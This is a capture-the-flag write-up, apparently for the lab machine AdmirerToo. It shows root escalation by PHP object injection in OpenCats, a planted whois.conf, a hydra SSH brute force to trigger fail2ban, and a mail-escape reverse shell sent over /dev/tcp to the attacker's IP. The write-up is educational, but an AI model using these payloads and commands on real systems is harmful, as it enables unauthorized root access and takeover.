I can trigger `fail2ban` to send an email by brute forcing SSH. To exploit the `fail2ban` vulnerability, I need to be able to control the response AdmirerToo gets from a `whois` lookup on my IP. This means I need to configure `whois` to contact my server.

The devel user has write access to `/usr/local/etc`. And OpenCats is running as devel, with a file write vulnerability. So I will try to write a `whois.conf` file into `/usr/local/etc` that will tell AdmirerToo to contact my host for a whois lookup, where I can return a payload that is executed.

#### Write Config File

The `whois.conf` [file](https://manpages.debian.org/jessie/whois/whois.conf.5.en.html) is two fields per line:
- a pattern to match on object in question
- the server to use

In the real world, that might look something like [this example](https://www.unpm.org/wiki/Sample_whois.conf):

```

##
# WHOIS servers for new TLDs (http://www.iana.org/domains/root/db)
# Current as of 2021-01-30 13:59 UTC
##

\.aarp$ whois.nic.aarp
\.abarth$ whois.afilias-srs.net
\.abbott$ whois.afilias-srs.net
\.abbvie$ whois.afilias-srs.net
\.abc$ whois.nic.abc
\.abogado$ whois.nic.abogado
\.abudhabi$ whois.nic.abudhabi
\.academy$ whois.nic.academy
\.accountant$ whois.nic.accountant
\.accountants$ whois.nic.accountants
\.ac$ whois.nic.ac
\.aco$ whois.nic.aco
...[snip]...

```

`fail2ban` is going to look up my IP, and I want it to ask my IP, so I want to write something like:

```
10.10.14.6 10.10.14.6

```

Following the [OpenCats exploit writeup](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html), I’ll create that file. I’ll clone [phpggc](https://github.com/ambionics/phpggc) to my machine (and update my path to include running it), and run it just like in the writeup:

```

oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.6+10.10.14.6%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D

```

This will write the contents of the local `whois.conf` into `/usr/local/etc/whois.conf` on AdmirerToo.

In Firefox where I’m logged in as jennifer, I’ll visit this url:

```

http://localhost:8081/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.6+10.10.14.6%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D

```

The good news is that the file is written:

```

jennifer@admirertoo:~$ ls -l /usr/local/etc/
total 4
-rw-r--r-- 1 devel devel 254 Dec 15 19:51 whois.conf

```

The bad news is that it doesn’t match the format I need:

```

jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
[{"Expires":1,"Discard":false,"Value":"10.10.14.6 10.10.14.6\n"}]

```

#### Write Better Config File

Because the first field is a pattern (regex), I’m very lucky that the first character written is a `[`. If I can close that, what is inside will be treated as a group of characters. If I can put a `*` right after, then it will match on 0 or more of those characters. So I’ll aim for:

```

[stuff]*10.10.14.6

```

That would match on my IP, with the `*` just being 0 of the characters from `[stuff]`.

I’ll also have stuff a the end that I want to get rid of. I’ll try to comment that out. So my `whois.conf` will be (I don’t think I need to close the `"` before the `]`, but it won’t hurt):

```

"]*10.10.14.6 10.10.14.6 #

```

Generate the PHP object:

```

oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A28%3A%22%22%5D%2A10.10.14.6+10.10.14.6+%23%0A%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D

```

Submit it via Firefox, and the file exists:

```

jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
[{"Expires":1,"Discard":false,"Value":"\"]*10.10.14.6 10.10.14.6 #\n\n"}]

```

Unfortunately, if I try to run `whois 10.10.14.6`, it fails:

```

jennifer@admirertoo:~$ whois 10.10.14.6
Cannot parse this line: #\n\n"}]

```

#### whois Source

I’ll turn to the `whois` source to take a look at how it parses the config file ([here](https://github.com/rfc1036/whois/blob/934a9221a769b6f5fc8aeb216461ff77e506ce75/whois.c#L419-L453)). Starting at line 415, it creates a buffer `buf` that’s 512 bytes, and opens the file:

```

#ifdef CONFIG_FILE
const char *match_config_file(const char *s)
{
    FILE *fp;
    char buf[512];
    static const char delim[] = " \t";

    if ((fp = fopen(CONFIG_FILE, "r")) == NULL) {
	if (errno != ENOENT)
	    err_sys("Cannot open " CONFIG_FILE);
	return NULL;
    }

```

Then, it reads 512 bytes at a time into `buf`:

```

    while (fgets(buf, sizeof(buf), fp) != NULL) {
	    char *p;
	    const char *pattern, *server;
#ifdef HAVE_REGEXEC
    	int i;
		regex_t re;
#endif

```

It then finds `\r\n` (newline) and replaces that with null, terminating the string:

```

    if ((p = strpbrk(buf, "\r\n")))
                *p = '\0';

```

After checks for commented lines and empty lines, it uses `strtok` to get the first three items, split on space or tab:

```

	pattern = strtok(p, delim);
	server = strtok(NULL, delim);
	if (!pattern || !server)
	    err_quit(_("Cannot parse this line: %s"), p);
	p = strtok(NULL, delim);
	if (p)
	    err_quit(_("Cannot parse this line: %s"), p);

```

The first is `pattern`, the second is `server`, and if the third exists, it fails. That explains why I can’t comment after the pattern and server.

This means that I can put a bunch of whitespace after my two items, if it goes beyond 512, then what follows won’t be parsed.

#### Write Working Config File

Based on the analysis above, I’ll add a ton of whitespace to the end of the PHP object. Sending a bunch of whitespace at the end will roll that extra junk out of scope:

```

oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A661%3A%22%22%5D%2A10.10.14.6+10.10.14.6+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%23%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D

```

The longer file makes it to AdmirerToo:

```

jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
[{"Expires":1,"Discard":false,"Value":"\"]*10.10.14.6 10.10.14.6                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           #\n"}]

```

And now when I run `whois 10.10.14.6`, it just hangs, and there’s a connection at my `nc` listening:

```

oxdf@hacky$ nc -lnvp 43
Listening on 0.0.0.0 43
Connection received on 10.10.11.137 40334
10.10.14.6

```

#### Trigger fail2ban

That worked using `whois`. Next I’ll trigger it using SSH. `hydra` will work to brute force with `hydra -I -l jennifer -P /usr/share/wordlists/rockyou.txt 10.10.11.137 ssh`. After it runs for a bit, my SSH session hangs, and there’s a connection at `nc` just like above.

#### Shell

I’ll put the following payload into `ncat` (`nc` doesn’t work… I’ll explore in [Beyond Root](#beyond-root)) on the `whois` port, 43:

```

oxdf@hacky$ echo -e "0xdf\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1'\n" | ncat -lnvp 43
Listening on 0.0.0.0 43

```

I’ll also start a listener on 443 to catch the shell. I’ll start `hydra`, and refresh Firefox a few times. Once I’m banned, there’s a connection at the first `nc`, and then at the second:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.137 35248
bash: cannot set terminal process group (4794): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/# 

```

I can upgrade the shell and read `root.txt`:

```

root@admirertoo:/# cat /root/root.txt
ec61f63f************************

```

## Beyond Root

I needed to use `ncat` and not `nc` to make the [root exploit](#shell-1) work, which is curious. Why would that matter? Here’s a summary of how I figured out what was going on.

### WireShark

First I’ll fire up Wireshark and watch the exchange to see what’s different. Looking at the two TCP streams, nothing is different. I’ll move it to hex dump mode and look at the data my VM sends back. For `ncat`:

```

    00000000  70 77 6e 65 64 0a 7e 21  20 62 61 73 68 20 2d 63   pwned.~!  bash -c
    00000010  20 27 62 61 73 68 20 2d  69 20 26 3e 2f 64 65 76    'bash - i &>/dev
    00000020  2f 74 63 70 2f 31 30 2e  31 30 2e 31 34 2e 36 2f   /tcp/10. 10.14.6/
    00000030  34 34 33 20 30 3e 26 31  27 0a 0a                  443 0>&1 '..

```

And for `nc`:

```

    00000000  70 77 6e 65 64 0a 7e 21  20 62 61 73 68 20 2d 63   pwned.~!  bash -c
    00000010  20 27 62 61 73 68 20 2d  69 20 26 3e 2f 64 65 76    'bash - i &>/dev
    00000020  2f 74 63 70 2f 31 30 2e  31 30 2e 31 34 2e 36 2f   /tcp/10. 10.14.6/
    00000030  34 34 33 20 30 3e 26 31  27 0a 0a                  443 0>&1 '..

```

These two are exactly the same. So it’s not a matter of what content is being sent back to the `whois` query.

### Leaving Hanging

Looking at the PCAP for `ncat`, it looks like this:

![image-20220526135427554](https://0xdfimages.gitlab.io/img/image-20220526135427554.png)

The entire exchange takes place over less than 0.2 seconds. With the `nc` one, which I had just left running after failure, it’s roughly the same pattern, but the timing is way different:

![image-20220526135451765](https://0xdfimages.gitlab.io/img/image-20220526135451765.png)

It seems like `nc` gets stuck waiting for some reason before sending the rest of the answer. Only after a full minute has passed does the AdmirerToo send a `[FIN, ACK]`, which then prompts `nc` to send the rest of the answer.

### Work Around

I stumbled into a bit of a workaround on this, which in hindsight makes perfect sense. I’ve been in many scenarios where I’m trying to get a file off a remote host, and I pipe it into `nc`, and then receive it on my host, and it just hangs. After a few seconds, I’ll Ctrl-c to kill the connection (and always check that the hashes match).

The same idea works here. If I wait until the connection comes in, and then Ctrl-c at my local `nc`, the exploit works just fine:

```

oxdf@hacky$ echo -e "0xdf\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1'\n" | nc -lnvp 43
Listening on 0.0.0.0 43
Connection received on 10.10.11.137 58468
10.10.14.6
^C

```

At `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.137 57392
bash: cannot set terminal process group (3231): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/#

```